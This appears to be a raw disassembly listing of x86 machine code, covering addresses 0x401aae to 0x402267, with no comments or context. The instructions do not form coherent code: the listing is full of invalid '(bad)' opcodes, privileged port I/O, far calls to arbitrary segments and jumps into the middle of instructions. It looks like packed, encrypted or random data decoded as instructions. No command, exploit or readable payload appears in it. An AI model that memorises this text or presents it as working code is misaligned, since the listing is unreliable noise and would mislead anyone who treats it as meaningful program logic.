  401aae:	ss ins DWORD PTR es:[edi],dx
  401ab0:	push   cs
  401ab1:	call   0xdeea:0x2ddc5123
  401ab8:	inc    edx
  401ab9:	aas    
  401aba:	fs push ebp
  401abc:	(bad)  
  401abd:	cmp    dh,cl
  401abf:	push   eax
  401ac0:	lods   al,BYTE PTR ds:[esi]
  401ac1:	pop    edi
  401ac2:	imul   ecx,DWORD PTR [edx+0x17a7edee],0x39
  401ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aca:	fwait
  401acb:	fwait
  401acc:	in     al,dx
  401acd:	int    0xad
  401acf:	mov    bh,0xb2
  401ad1:	mov    bl,0x66
  401ad3:	retf   
  401ad4:	lds    ebx,FWORD PTR [ecx]
  401ad6:	mov    bh,0x65
  401ad8:	mov    ds:0x87befd1f,al
  401add:	retf   0x6165
  401ae0:	iret   
  401ae1:	retf   
  401ae2:	and    eax,0x5cc8dc30
  401ae7:	cwde   
  401ae8:	mov    ebx,0x3664ccbe
  401aed:	inc    esp
  401aee:	push   ds
  401aef:	mov    bl,0x2f
  401af1:	push   eax
  401af2:	imul   edi,DWORD PTR [ecx+0xa],0x4c
  401af6:	js     0x401af6
  401af8:	out    dx,eax
  401af9:	lahf   
  401afa:	pop    esi
  401afb:	leave  
  401afc:	mov    al,ds:0xded2f1c2
  401b01:	sub    DWORD PTR [edi-0x1e],ebp
  401b04:	jne    0x401adc
  401b06:	iret   
  401b07:	jge    0x401b46
  401b09:	xchg   edi,eax
  401b0a:	lods   eax,DWORD PTR ds:[esi]
  401b0b:	ret    0x28e6
  401b0e:	dec    esi
  401b0f:	mov    BYTE PTR [eax],al
  401b11:	ins    BYTE PTR es:[edi],dx
  401b12:	enter  0x68b3,0xdc
  401b16:	jns    0x4f50
  401b1b:	sub    esp,DWORD PTR [edx+ecx*8-0x7849888b]
  401b22:	fild   DWORD PTR [esi+0x1247c68b]
  401b28:	xchg   esi,eax
  401b29:	(bad)
  401b2c:	jp     0x401aed
  401b2e:	inc    ebp
  401b2f:	push   ecx
  401b30:	ret    
  401b31:	(bad)  
  401b32:	dec    ebp
  401b33:	push   esi
  401b34:	retf   0xcb35
  401b37:	mov    BYTE PTR [edx+0x5bd2b5d9],al
  401b3d:	and    DWORD PTR [eax+0x544d1251],0x12ba347f
  401b47:	es in  al,dx
  401b49:	mov    al,ds:0xb172ca23
  401b4e:	mov    al,0x5
  401b50:	jecxz  0x401b05
  401b52:	cmc    
  401b53:	fsubr  QWORD PTR [eax+ebx*8-0x3f09ef7e]
  401b5a:	sbb    eax,0x3183a5b9
  401b5f:	mov    ah,BYTE PTR [edx]
  401b61:	in     al,0xd3
  401b63:	mov    bl,0x6f
  401b65:	pushf  
  401b66:	lods   eax,DWORD PTR ds:[esi]
  401b67:	bound  edx,QWORD PTR [ebx+0x9]
  401b6a:	mov    ah,0xe
  401b6c:	sub    esp,esp
  401b6e:	sbb    ecx,DWORD PTR ds:[eax-0x7b]
  401b72:	mov    bl,0x63
  401b74:	ja     0x401b32
  401b76:	add    bh,al
  401b78:	inc    ecx
  401b79:	fstp   TBYTE PTR ds:0x3b9ad11
  401b7f:	mov    ch,0xa6
  401b81:	dec    ecx
  401b82:	ret    
  401b83:	inc    ecx
  401b84:	or     DWORD PTR [esi+0x620d2403],ebx
  401b8a:	leave  
  401b8b:	inc    esi
  401b8c:	mov    esp,0xbc9ea2c8
  401b91:	push   ebp
  401b92:	inc    ecx
  401b93:	push   ebp
  401b94:	test   eax,0xd10cab03
  401b99:	lods   eax,DWORD PTR ds:[esi]
  401b9a:	sbb    eax,0x5cd72a46
  401b9f:	rcr    edi,0x62
  401ba2:	(bad)  
  401ba3:	ja     0x401be6
  401ba5:	popa   
  401ba6:	jnp    0x401bd9
  401ba8:	fcmovne st,st(6)
  401bab:	stos   BYTE PTR es:[edi],al
  401bac:	test   al,0xf4
  401baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb0:	mov    ecx,0x53d4472a
  401bb5:	mov    edi,0x3e28829b
  401bba:	jnp    0x401b8f
  401bbc:	xchg   edx,eax
  401bbd:	aad    0x2f
  401bbf:	adc    BYTE PTR [esi+0x56],ah
  401bc2:	rol    BYTE PTR [edi],cl
  401bc4:	jp     0x401bce
  401bc6:	xchg   edx,eax
  401bc7:	or     ebx,eax
  401bc9:	out    0x9d,eax
  401bcb:	sub    al,dh
  401bcd:	jno    0x401b74
  401bcf:	icebp  
  401bd0:	cmp    bl,BYTE PTR [esi-0x7fd86a93]
  401bd6:	test   DWORD PTR [edx-0x77e8def7],0x2134280
  401be0:	jbe    0x401baa
  401be2:	cmp    ch,0xd5
  401be5:	ss sub al,0xae
  401be8:	std    
  401be9:	dec    ebx
  401bea:	out    dx,eax
  401beb:	xor    DWORD PTR [esi],esp
  401bed:	es aad 0x7e
  401bf0:	mov    eax,0xa45d1e8f
  401bf5:	inc    ecx
  401bf6:	mov    ch,0xe1
  401bf8:	sbb    eax,0x65e11ea6
  401bfd:	inc    eax
  401bfe:	dec    esi
  401bff:	dec    ebx
  401c00:	(bad)  
  401c01:	in     eax,0xf3
  401c03:	or     DWORD PTR [ebp-0x4a56088a],0xffffff80
  401c0a:	fsub   QWORD PTR [edx+eiz*4]
  401c0d:	sbb    ah,BYTE PTR [eax]
  401c0f:	fimul  WORD PTR [ebx+esi*2+0x51ecbbc2]
  401c16:	out    dx,eax
  401c17:	xor    al,0xfd
  401c19:	jl     0x401c75
  401c1b:	outs   dx,DWORD PTR ds:[esi]
  401c1c:	xchg   esp,eax
  401c1d:	dec    edi
  401c1e:	jmp    0x401c97
  401c20:	mov    ebp,DWORD PTR [edi]
  401c22:	loope  0x401c8e
  401c24:	cmp    ebx,DWORD PTR [edi]
  401c26:	sub    esi,DWORD PTR [ebp+edi*4-0x21e5f487]
  401c2d:	push   ss
  401c2e:	mov    ch,0x2c
  401c30:	add    DWORD PTR [eax+0x5b],esi
  401c33:	and    al,0xcd
  401c35:	jle    0x401c95
  401c37:	(bad)  
  401c38:	aaa    
  401c39:	mov    ebp,0x674864bc
  401c3e:	imul   edx,DWORD PTR [ebp-0x36],0x18
  401c42:	sbb    eax,0xce9c94a4
  401c47:	jg     0x401cb0
  401c49:	mov    ds:0x221464f7,al
  401c4e:	enter  0xc15a,0x96
  401c52:	jmp    0xa327:0xaa41cbd5
  401c59:	mov    bh,0x95
  401c5b:	and    edx,ebx
  401c5d:	lods   eax,DWORD PTR ds:[esi]
  401c5e:	mul    BYTE PTR [esi+0x727cc01d]
  401c64:	mov    ds:0x8e87582b,al
  401c69:	or     al,0x76
  401c6b:	lods   al,BYTE PTR ds:[esi]
  401c6c:	popa   
  401c6d:	cmp    eax,0x3bf38e7c
  401c72:	pop    esp
  401c73:	pushf  
  401c74:	popf   
  401c75:	stos   DWORD PTR es:[edi],eax
  401c76:	int3   
  401c77:	(bad)  
  401c79:	adc    DWORD PTR [ebx+0x6d],esi
  401c7c:	or     eax,0x538fe047
  401c81:	dec    edi
  401c82:	push   edx
  401c83:	xchg   ebx,eax
  401c84:	retf   0x1ca8
  401c87:	and    bl,BYTE PTR [esi-0x434928df]
  401c8d:	cmp    eax,DWORD PTR [edx]
  401c8f:	pop    esi
  401c90:	mov    esp,0xd1d31945
  401c95:	mov    ch,dl
  401c97:	lea    eax,[esi+0x27b19176]
  401c9d:	dec    ebp
  401c9e:	adc    edx,DWORD PTR [ebp+edi*8+0x1af9ade9]
  401ca5:	mov    ebx,0xc55c5ce7
  401caa:	into   
  401cab:	test   eax,0x117d8f45
  401cb0:	jns    0x401d09
  401cb2:	xchg   ecx,eax
  401cb3:	xchg   esp,eax
  401cb4:	jge    0x401d1b
  401cb6:	pop    esp
  401cb7:	(bad)  
  401cb8:	sbb    eax,0x132b1502
  401cbd:	fwait
  401cbe:	xor    al,0xc7
  401cc0:	adc    esp,DWORD PTR [edi+ebx*4]
  401cc3:	xor    dh,al
  401cc5:	add    edx,DWORD PTR [ebx+0x2371c77f]
  401ccb:	popa   
  401ccc:	pop    ss
  401ccd:	or     eax,0x3f5a9616
  401cd2:	sbb    dl,BYTE PTR [ebx+0x7928866a]
  401cd8:	popa   
  401cd9:	cmp    al,0x46
  401cdb:	fstp   QWORD PTR [edx-0x693f8bf3]
  401ce1:	add    al,0xdc
  401ce3:	dec    esi
  401ce4:	jmp    0x401d50
  401ce6:	mov    edx,0x27bfbb66
  401ceb:	scas   al,BYTE PTR es:[edi]
  401cec:	mov    bl,0x2
  401cee:	sti    
  401cef:	push   ss
  401cf0:	xor    eax,DWORD PTR [edi+0x527fdbcb]
  401cf6:	iret   
  401cf7:	shr    DWORD PTR [esp+eax*2+0x1c0db485],0x52
  401cff:	dec    edx
  401d00:	xchg   edx,eax
  401d01:	imul   esi,DWORD PTR [eax+0x78],0xffffffe1
  401d05:	mov    dh,BYTE PTR [ecx-0x533631bb]
  401d0b:	sub    eax,0xd7da88f0
  401d10:	rcl    DWORD PTR [esi+0x5b],1
  401d13:	push   edi
  401d14:	outs   dx,DWORD PTR ds:[esi]
  401d15:	js     0x401cb9
  401d17:	push   0xc225042f
  401d1c:	and    eax,eax
  401d1e:	inc    esi
  401d1f:	push   ecx
  401d20:	xchg   esi,eax
  401d21:	add    BYTE PTR [ecx+0x6e2fd0c5],bh
  401d27:	jne    0x401d0e
  401d29:	fldenv [ecx-0x39]
  401d2c:	push   0x54eb47ee
  401d31:	daa    
  401d32:	mov    esp,ss
  401d34:	sub    al,0x64
  401d36:	lock adc al,BYTE PTR [eax+0x63f50a6c]
  401d3d:	pop    esi
  401d3e:	or     ah,BYTE PTR [ebx]
  401d40:	push   ecx
  401d41:	xor    eax,0x34a94bbf
  401d46:	test   DWORD PTR [ebp-0x4f],ecx
  401d49:	or     DWORD PTR [ebp+edx*1+0x6d05ab24],edi
  401d50:	or     ebp,DWORD PTR ds:0x9794a89c
  401d56:	lods   al,BYTE PTR ds:[esi]
  401d57:	dec    esp
  401d58:	ret    
  401d59:	push   es
  401d5a:	shl    BYTE PTR [edx-0x2b],cl
  401d5d:	fcmovnu st,st(2)
  401d5f:	icebp  
  401d60:	fbstp  TBYTE PTR [edi]
  401d62:	scas   al,BYTE PTR es:[edi]
  401d63:	clc    
  401d64:	inc    ecx
  401d65:	dec    esi
  401d66:	adc    BYTE PTR [ebx+0x57e3ae04],al
  401d6c:	(bad)  
  401d6d:	pop    ebp
  401d6e:	mov    edx,0xa34eef25
  401d73:	lods   eax,DWORD PTR ds:[esi]
  401d74:	mov    eax,ds:0x822b1c7d
  401d79:	(bad)  
  401d7a:	jg     0x401d50
  401d7c:	cmc    
  401d7d:	dec    eax
  401d7e:	pop    edx
  401d7f:	mov    ah,0x78
  401d81:	and    BYTE PTR [ebx],cl
  401d83:	in     eax,0x6c
  401d85:	pop    edi
  401d86:	std    
  401d87:	shl    DWORD PTR [edi+0x76],1
  401d8a:	mov    dl,0x3a
  401d8c:	jl     0x401d6b
  401d8e:	mov    ds:0x98e1093b,eax
  401d93:	xor    eax,0x61b0b689
  401d98:	test   BYTE PTR [esi+0x49c5738a],0xb7
  401d9f:	push   ebx
  401da0:	(bad)  
  401da2:	add    BYTE PTR [esi],ah
  401da4:	loopne 0x401de2
  401da6:	jle    0x401da9
  401da8:	and    edx,0x8e045e53
  401dae:	(bad)  
  401daf:	test   al,0xc2
  401db1:	inc    edx
  401db2:	adc    al,BYTE PTR [esi+0x369d63bd]
  401db8:	pop    es
  401db9:	jne    0x401de5
  401dbb:	jg     0x401e33
  401dbd:	push   esp
  401dbe:	cs out 0xc4,eax
  401dc1:	jecxz  0x401d76
  401dc3:	in     al,0xd1
  401dc5:	ret    
  401dc6:	std    
  401dc7:	jmp    0x526f4cc2
  401dcc:	repz call 0xfdc8:0xc99cf399
  401dd4:	sub    eax,DWORD PTR [ebx+0x3441611]
  401dda:	in     eax,0xe5
  401ddc:	jcxz   0x401de9
  401ddf:	jne    0x401e03
  401de1:	cmp    eax,0xd5cedc52
  401de6:	leave  
  401de7:	mov    ch,0x71
  401de9:	push   ebp
  401dea:	test   al,0x6b
  401dec:	add    DWORD PTR [eax+0x15fb3330],ebx
  401df2:	mov    DWORD PTR [edi+0x2d],esi
  401df5:	mov    edi,DWORD PTR [ebp-0x4a]
  401df8:	sbb    DWORD PTR [eax-0x1f],edx
  401dfb:	scas   eax,DWORD PTR es:[edi]
  401dfc:	or     BYTE PTR [eax-0x76],ch
  401dff:	cmp    ebx,esi
  401e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e02:	cmp    DWORD PTR [eax+0x6bf37be4],esp
  401e08:	jb     0x401d94
  401e0a:	inc    esp
  401e0b:	pop    edi
  401e0c:	mov    eax,ds:0xf2b94a95
  401e11:	pop    ebp
  401e12:	sub    bl,dl
  401e14:	test   DWORD PTR [edi],ebp
  401e16:	xchg   ebx,eax
  401e17:	mov    bh,0x55
  401e19:	sub    DWORD PTR [eax+0x41],0x6d9923a7
  401e20:	mov    cl,0x6c
  401e22:	mov    bl,0xbd
  401e24:	dec    edx
  401e25:	mov    dl,0x2a
  401e27:	cmp    eax,0xc1beb997
  401e2c:	arpl   WORD PTR [eax],bp
  401e2e:	jo     0x401dcd
  401e30:	(bad)  
  401e31:	es inc edi
  401e33:	ja     0x401e78
  401e35:	out    dx,eax
  401e36:	cmp    al,0xd5
  401e38:	and    al,0xfb
  401e3a:	sub    cl,BYTE PTR [ebx+0x7f045c86]
  401e40:	sbb    eax,0xf0ad8a09
  401e45:	push   0x2f
  401e47:	jmp    0x6f9370d1
  401e4c:	dec    esp
  401e4d:	mov    WORD PTR [esi+0xcc6779],es
  401e53:	into   
  401e54:	lock push es
  401e56:	adc    DWORD PTR [edi],edi
  401e58:	add    ch,BYTE PTR [ecx-0x14cc5766]
  401e5e:	mov    ax,0x4e7e
  401e62:	push   es
  401e63:	cmp    edx,DWORD PTR [edx]
  401e65:	xchg   BYTE PTR [edx+esi*1+0x1e],al
  401e69:	xchg   ecx,eax
  401e6a:	inc    edi
  401e6b:	jecxz  0x401ed4
  401e6d:	push   edi
  401e6e:	inc    ebx
  401e6f:	xchg   ebx,eax
  401e70:	and    BYTE PTR [ebx+0x4f48ece2],bl
  401e76:	jbe    0x401e65
  401e78:	xchg   ecx,eax
  401e79:	pop    eax
  401e7a:	daa    
  401e7b:	int    0x97
  401e7d:	xchg   DWORD PTR [edi+0x45bd919a],edx
  401e83:	cdq    
  401e84:	and    BYTE PTR [ebp-0x5320c87f],0x32
  401e8b:	inc    ebp
  401e8c:	dec    esi
  401e8d:	or     eax,DWORD PTR [ebx+0xb8c0dd1]
  401e93:	cmp    BYTE PTR [esi],ah
  401e95:	dec    ecx
  401e96:	inc    edx
  401e97:	mov    edi,0xad68d407
  401e9c:	ins    DWORD PTR es:[edi],dx
  401e9d:	inc    esp
  401e9e:	jecxz  0x401e9c
  401ea0:	pop    esp
  401ea1:	push   esp
  401ea2:	add    DWORD PTR [eax],esp
  401ea4:	cmc    
  401ea5:	jmp    0xd99a2361
  401eaa:	mov    BYTE PTR [eax+edx*1-0x17],cl
  401eae:	int3   
  401eaf:	mov    eax,0xe9407967
  401eb4:	data16 ror BYTE PTR [ebx],1
  401eb7:	push   ds
  401eb8:	lods   eax,DWORD PTR ds:[esi]
  401eb9:	or     DWORD PTR [ecx],ebx
  401ebb:	adc    ebx,DWORD PTR [ebx]
  401ebd:	mov    bl,0xcd
  401ebf:	cmp    dl,al
  401ec1:	int    0x34
  401ec3:	icebp  
  401ec4:	or     BYTE PTR [edi],0x17
  401ec7:	push   0xffffffb0
  401ec9:	jnp    0x401e5f
  401ecb:	mov    bl,0x83
  401ecd:	das    
  401ece:	mov    edx,DWORD PTR [esi]
  401ed0:	mov    al,ds:0x22a210c0
  401ed5:	ins    DWORD PTR es:[edi],dx
  401ed6:	scas   al,BYTE PTR es:[edi]
  401ed7:	and    ch,BYTE PTR [ebx-0x1a]
  401eda:	dec    eax
  401edb:	dec    edx
  401edc:	and    DWORD PTR [eax-0x6375cbdf],ecx
  401ee2:	mov    al,ds:0xcca5f410
  401ee7:	fcomi  st,st(2)
  401ee9:	outs   dx,DWORD PTR ds:[esi]
  401eea:	mov    al,0x52
  401eec:	mov    dl,0x8f
  401eee:	mov    cl,BYTE PTR [ebp-0x29]
  401ef1:	cs pop edi
  401ef3:	in     eax,dx
  401ef4:	jns    0x401f4a
  401ef6:	cdq    
  401ef7:	add    BYTE PTR [ebp+0x204794be],dh
  401efd:	and    ebx,esp
  401eff:	retf   0x2c42
  401f02:	pop    ebx
  401f03:	push   ss
  401f04:	daa    
  401f05:	jo     0x401f07
  401f07:	stos   BYTE PTR es:[edi],al
  401f08:	mov    bl,BYTE PTR [edi]
  401f0a:	push   esi
  401f0b:	pop    es
  401f0c:	test   eax,0x691924ac
  401f11:	sub    BYTE PTR [edx],al
  401f13:	add    cl,0x53
  401f16:	in     eax,0x4b
  401f18:	ds push esp
  401f1a:	call   0x731d:0x120c619b
  401f21:	mov    ebp,DWORD PTR [edx]
  401f23:	dec    edi
  401f24:	pusha  
  401f25:	xor    al,0x7b
  401f27:	test   al,0x6c
  401f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f2a:	push   0x1da8e1a3
  401f2f:	fidiv  WORD PTR [esi+0x56]
  401f32:	or     ebx,eax
  401f34:	cwde   
  401f35:	fld    st(3)
  401f37:	cmp    esi,esi
  401f39:	js     0x401f4e
  401f3b:	cmp    eax,0xfbb93a48
  401f40:	mov    ah,0x3c
  401f42:	addr16 mov al,0x73
  401f45:	sahf   
  401f46:	mov    edx,0x38a732d9
  401f4b:	mov    ebp,0x786287e0
  401f50:	xor    DWORD PTR [edi+esi*8],esi
  401f53:	popa   
  401f54:	inc    eax
  401f55:	mov    ds:0x3203f223,al
  401f5a:	xchg   esp,eax
  401f5b:	call   0x17bf:0xd7cfefdf
  401f62:	push   ebp
  401f63:	sub    ebp,edi
  401f65:	adc    dl,dl
  401f67:	ret    0x5bde
  401f6a:	mov    BYTE PTR [ecx],cl
  401f6c:	sub    bh,BYTE PTR [edx+edi*4]
  401f6f:	dec    edx
  401f70:	push   edi
  401f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f72:	dec    ecx
  401f73:	cld    
  401f74:	xchg   esp,eax
  401f75:	enter  0xa63a,0xf0
  401f79:	(bad)  
  401f7a:	jle    0x401fed
  401f7c:	jns    0x401fb2
  401f7e:	sbb    cl,BYTE PTR [edi+ebx*8]
  401f81:	retf   
  401f82:	lahf   
  401f83:	outs   dx,BYTE PTR ds:[esi]
  401f84:	dec    esp
  401f85:	mov    esi,0x12d79f77
  401f8a:	ror    ch,cl
  401f8c:	pop    ecx
  401f8d:	fbld   TBYTE PTR [esi-0x17c49b8e]
  401f93:	xor    eax,eax
  401f95:	pop    eax
  401f96:	popa   
  401f97:	jp     0x401f83
  401f99:	cmp    al,0x55
  401f9b:	ret    0x1363
  401f9e:	pop    edx
  401f9f:	fmul   st,st(1)
  401fa1:	gs adc BYTE PTR fs:[eax-0x421edd8],0x8
  401faa:	hlt    
  401fab:	push   esp
  401fac:	cwde   
  401fad:	clc    
  401fae:	xor    ch,cl
  401fb0:	push   cs
  401fb1:	in     eax,dx
  401fb2:	mov    esp,0x7153c465
  401fb7:	popa   
  401fb8:	mov    ds:0x12a804e,al
  401fbd:	dec    esi
  401fbe:	cmp    esi,ebp
  401fc0:	push   ebx
  401fc1:	inc    ebx
  401fc2:	retf   0xbcea
  401fc5:	pop    ss
  401fc6:	rdtsc  
  401fc8:	jno    0x40201d
  401fca:	xor    DWORD PTR [esi-0x36e6f827],0x19
  401fd1:	int3   
  401fd2:	loope  0x401f66
  401fd4:	data16 jo 0x401fac
  401fd7:	push   edx
  401fd8:	js     0x401f62
  401fda:	cmp    ch,BYTE PTR [bp+si]
  401fdd:	pop    esp
  401fde:	fstp   TBYTE PTR [esi-0x42ea89a5]
  401fe4:	pop    edx
  401fe5:	xchg   edi,eax
  401fe6:	cmp    eax,0x3e2fff87
  401feb:	push   ecx
  401fec:	ds cld 
  401fee:	mov    al,0x72
  401ff0:	dec    edi
  401ff1:	sub    al,0x32
  401ff3:	int    0xa
  401ff5:	enter  0xca57,0x7e
  401ff9:	pop    ss
  401ffa:	add    esi,DWORD PTR ds:0xc027d479
  402000:	or     ebp,ebx
  402002:	mov    eax,0x4dfdb7fe
  402007:	xchg   ebx,eax
  402008:	mov    ch,0xa2
  40200a:	std    
  40200b:	jmp    0x4d3c46ce
  402010:	cmc    
  402011:	mov    ebx,eax
  402013:	(bad)  
  402014:	pop    eax
  402015:	push   ebp
  402016:	jecxz  0x401ffe
  402018:	push   esp
  402019:	dec    ebx
  40201a:	popf   
  40201b:	loop   0x402099
  40201d:	inc    ebx
  40201e:	xchg   ecx,eax
  40201f:	push   edx
  402020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402021:	(bad)  
  402022:	mov    ecx,0xbdfa0f31
  402027:	js     0x401fc2
  402029:	jb     0x401fe9
  40202b:	loop   0x401ff5
  40202d:	mov    dh,dl
  40202f:	xchg   esi,eax
  402030:	push   eax
  402031:	in     al,0x4f
  402033:	mov    esi,0xe3d6268b
  402038:	ret    
  402039:	in     al,dx
  40203a:	mov    eax,0x65a95305
  40203f:	lahf   
  402040:	gs jmp 0x9859:0xf8bd2ccc
  402048:	mov    al,0x73
  40204a:	mov    ?,WORD PTR [edi]
  40204c:	adc    eax,0x91a634a5
  402051:	mov    esp,0xce1a610d
  402056:	(bad)  
  402058:	push   ds
  402059:	inc    esi
  40205a:	dec    edx
  40205b:	xchg   ecx,eax
  40205c:	inc    esp
  40205d:	gs xchg ecx,eax
  40205f:	pop    eax
  402060:	call   0xd83e:0x5e47f39e
  402067:	sub    al,BYTE PTR [ecx+ebp*1+0x2c]
  40206b:	ret    0x931a
  40206e:	fwait
  40206f:	mov    al,0xc0
  402071:	or     DWORD PTR [ebp-0x1e],edx
  402074:	mov    dl,0x4d
  402076:	out    dx,al
  402077:	push   esi
  402078:	popa   
  402079:	sbb    al,0xf1
  40207b:	lods   eax,DWORD PTR ds:[esi]
  40207c:	add    edi,ebp
  40207e:	retf   0xf4bc
  402081:	or     DWORD PTR [ecx+0xf],esp
  402084:	imul   edi,DWORD PTR [ecx],0x37
  402087:	add    BYTE PTR [edx],ch
  402089:	sub    eax,0x701d5e78
  40208e:	out    0xd1,al
  402090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402091:	retf   
  402092:	adc    DWORD PTR [esi+0x412f4015],0xa4bdbc30
  40209c:	(bad)  
  40209d:	sub    al,BYTE PTR [ebp-0x42]
  4020a0:	ret    
  4020a1:	sub    al,0xd5
  4020a3:	jle    0x402099
  4020a5:	xchg   ecx,eax
  4020a6:	mov    bh,0x21
  4020a8:	fadd   QWORD PTR [ebx-0x54]
  4020ab:	shl    BYTE PTR [ebx+0x5490127],1
  4020b1:	in     eax,0x1c
  4020b3:	dec    ebp
  4020b4:	adc    esp,DWORD PTR [edx+0x2e]
  4020b7:	lock jbe 0x4020d1
  4020ba:	inc    eax
  4020bb:	call   0xd15f:0xabc5f533
  4020c2:	test   DWORD PTR ds:0x2574af55,0x6e0dfea0
  4020cc:	fisubr WORD PTR ds:0xd975f6c7
  4020d2:	ins    BYTE PTR es:[edi],dx
  4020d3:	sbb    eax,0xb4044e34
  4020d8:	js     0x402109
  4020da:	mov    esi,0x54bcdc51
  4020df:	test   DWORD PTR [esi+0x14],esi
  4020e2:	stos   DWORD PTR es:[edi],eax
  4020e3:	div    BYTE PTR [ebx]
  4020e5:	mov    ecx,ebp
  4020e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e8:	sbb    ebx,DWORD PTR [edx]
  4020ea:	pop    ecx
  4020eb:	pushf  
  4020ec:	mov    bh,0x82
  4020ee:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4020f0:	xchg   esi,eax
  4020f1:	sti    
  4020f2:	lods   al,BYTE PTR ds:[esi]
  4020f3:	fiadd  WORD PTR [edx+0x94e7761]
  4020f9:	sub    ah,al
  4020fb:	lahf   
  4020fc:	jo     0x4020b7
  4020fe:	dec    esp
  4020ff:	jne    0x40216f
  402101:	mov    esi,0xb7f67151
  402106:	loope  0x40211a
  402108:	ja     0x402188
  40210a:	(bad)  
  40210b:	daa    
  40210c:	not    BYTE PTR [edi]
  40210e:	jne    0x40211d
  402110:	mov    cl,0xe5
  402112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402113:	out    dx,eax
  402114:	or     ch,dh
  402116:	cmp    eax,esi
  402118:	and    eax,0x2ebc78c5
  40211d:	js     0x40218f
  40211f:	data16 sub dl,BYTE PTR [ebx+edi*2-0x6d]
  402124:	push   ss
  402125:	adc    DWORD PTR [ecx],0xa640c2c9
  40212b:	push   ebp
  40212c:	pop    edi
  40212d:	and    DWORD PTR [edi+0x5f],0x3e016351
  402134:	push   ebp
  402135:	mov    bl,0xa8
  402137:	les    ebx,FWORD PTR [edx-0x5f]
  40213a:	gs sbb eax,0xb2f3f516
  402140:	inc    esi
  402141:	or     al,0x8b
  402143:	push   ebp
  402144:	jb     0x4021bd
  402146:	mov    bh,0x25
  402148:	pusha  
  402149:	ins    DWORD PTR es:[edi],dx
  40214a:	aam    0x45
  40214c:	(bad)  
  40214d:	lahf   
  40214e:	sub    ah,ch
  402150:	sahf   
  402151:	sbb    ch,BYTE PTR [edi+0x4d]
  402154:	adc    ebp,eax
  402156:	out    0xfc,al
  402158:	retf   
  402159:	push   ebp
  40215a:	cld    
  40215b:	loope  0x402138
  40215d:	leave  
  40215e:	jmp    0x93bde614
  402163:	pop    eax
  402164:	pop    edi
  402165:	adc    DWORD PTR [esi-0x78],ebp
  402168:	int    0x10
  40216a:	stos   BYTE PTR es:[edi],al
  40216b:	data16 data16 shl BYTE PTR [esi-0xb],0x82
  402171:	dec    eax
  402172:	test   al,0x76
  402174:	fwait
  402175:	retf   0x5623
  402178:	js     0x40217b
  40217a:	push   0x90bdb9cb
  40217f:	sbb    bl,BYTE PTR [esi+ecx*4+0x3]
  402183:	out    dx,al
  402184:	add    DWORD PTR [ebp-0xd],eax
  402187:	xor    DWORD PTR [esi],edx
  402189:	mov    edx,DWORD PTR [eax+0x22b0630b]
  40218f:	inc    esi
  402190:	mov    ah,0x73
  402192:	push   es
  402193:	retf   
  402194:	nop
  402195:	shl    dl,cl
  402197:	sysenter 
  402199:	into   
  40219a:	aad    0x47
  40219c:	xor    bl,BYTE PTR [ebp+esi*8+0x1175bc57]
  4021a3:	les    ebp,FWORD PTR [edx+0x7e461c6f]
  4021a9:	cwde   
  4021aa:	jb     0x402222
  4021ac:	and    eax,0xde4dead1
  4021b1:	loop   0x4021c7
  4021b3:	pop    ebx
  4021b4:	xor    DWORD PTR [ebx],ebx
  4021b6:	adc    esp,esi
  4021b8:	push   esi
  4021b9:	pop    eax
  4021ba:	ret    0x4526
  4021bd:	add    ebx,edx
  4021bf:	mov    DWORD PTR [edi-0x5a],edi
  4021c2:	(bad)  
  4021c3:	sbb    al,0x8a
  4021c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c6:	xchg   ebp,eax
  4021c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c8:	lahf   
  4021c9:	mov    esi,0x38dc3f8f
  4021ce:	cmp    al,0xb6
  4021d0:	xor    edi,DWORD PTR [edi+0x1c]
  4021d3:	inc    DWORD PTR [ecx-0x1a45a31b]
  4021d9:	push   ebx
  4021da:	or     ch,dl
  4021dc:	in     eax,dx
  4021dd:	sbb    eax,0xe0986d0b
  4021e2:	dec    edx
  4021e3:	mov    ah,0x48
  4021e5:	pop    ebx
  4021e6:	mov    cs,esi
  4021e8:	xchg   edi,eax
  4021e9:	test   DWORD PTR [edx-0x72],0x8d29ce3a
  4021f0:	stos   BYTE PTR es:[edi],al
  4021f1:	data16 cmc 
  4021f3:	adc    DWORD PTR [ebp-0x3f],edi
  4021f6:	ins    BYTE PTR es:[edi],dx
  4021f7:	popa   
  4021f8:	sub    cl,BYTE PTR ds:0xed76522
  4021fe:	add    esi,DWORD PTR [ebp-0x63900eb2]
  402204:	test   bl,bh
  402206:	(bad)  
  402207:	pop    ss
  402208:	mov    ch,0x31
  40220a:	dec    ecx
  40220b:	mov    ah,0x63
  40220d:	fstp   QWORD PTR [ecx+ebp*2-0x6c5004bb]
  402214:	mov    dl,0x23
  402216:	mov    dh,0xd
  402218:	xchg   edx,eax
  402219:	xchg   esi,eax
  40221a:	lock push ebx
  40221c:	mov    al,ds:0x4749a7d3
  402221:	xchg   esp,eax
  402222:	cdq    
  402223:	pop    ds
  402224:	ds or  eax,0x6228a34
  40222a:	and    dh,dl
  40222c:	mov    bl,0xc0
  40222e:	scas   al,BYTE PTR es:[edi]
  40222f:	mov    al,ds:0x74b9368
  402234:	push   edx
  402235:	loop   0x4022a2
  402237:	adc    BYTE PTR [ecx+ebp*4],ah
  40223a:	outs   dx,DWORD PTR ds:[esi]
  40223b:	mov    edx,0x71824ba8
  402240:	pop    esi
  402241:	ret    
  402242:	xor    cl,bh
  402244:	ins    BYTE PTR es:[edi],dx
  402245:	jmp    0x4021fb
  402247:	or     DWORD PTR [ebx+esi*4-0x6e3ba04c],0x55
  40224f:	sbb    al,0x2a
  402251:	in     al,0xef
  402253:	les    edx,FWORD PTR [edi+esi*8-0x692b0b4b]
  40225a:	ret    
  40225b:	fwait
  40225c:	int3   
  40225d:	aad    0x10
  40225f:	cld    
  402260:	inc    ebp
  402261:	(bad)  [ebx-0x53]
  402264:	ins    BYTE PTR es:[edi],dx
  402265:	mov    esi,?
  402267:	jp     0x40223e
